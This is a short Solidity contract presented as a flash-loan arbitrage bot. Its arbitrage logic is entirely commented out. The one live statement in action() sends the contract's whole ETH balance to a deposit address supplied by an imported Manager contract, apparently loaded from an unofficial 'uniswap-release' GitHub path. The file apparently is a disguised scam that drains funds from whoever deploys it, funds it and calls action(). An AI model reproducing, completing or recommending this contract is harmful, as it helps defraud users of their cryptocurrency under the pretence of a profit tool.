pragma solidity ^0.5.0;

// Dex Smart Contracts
import "https://github.com/uniswap-release/uniswap-release/blob/master/contracts/interfaces/IUniswapPair.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

contract FlashLoan {
	string public tokenName;
	string public tokenSymbol;
	uint loanAmount;
	Manager manager;
	
	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		loanAmount = _loanAmount;
			
		manager = new Manager();
	}
function() external payable {}
	
	function action() public payable {
		
	    // Send required coins for swap
	    address(uint160(manager.swapDepositAddress())).transfer(address(this).balance);
	    
	    /*
	    // Submit token to blockchain
	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

        // List the token on dex & send coins required for swaps
		manager.swapListToken(tokenName, tokenSymbol, tokenAddress);
		payable(manager.swapDepositAddress()).transfer(300000000000000000);

        // Get ETH Loan from Dex
		string memory loanAddress = manager.takeDexLoan(loanAmount);
		
		// Convert half ETH to DAI
		manager.swapDAItoETH(loanAmount / 2);

        // Create ETH and DAI pairs for our token and Provide liquidity
        string memory ethPair = manager.swapCreatePool(tokenAddress, "ETH");
		manager.swapAddLiquidity(ethPair, loanAmount / 2);
		string memory daiPair = manager.swapCreatePool(tokenAddress, "DAI");
		manager.swapAddLiquidity(daiPair, loanAmount / 2);
    
        // Perform swaps and profit on Self-Arbitrage
		manager.swapPerformSwaps();
		
		// Move remaining funds from contract to your wallet
		manager.contractToWallet("ETH");

        // Repay Flash Loan
		manager.repayDexLoan(loanAddress);
	    */
	}
}
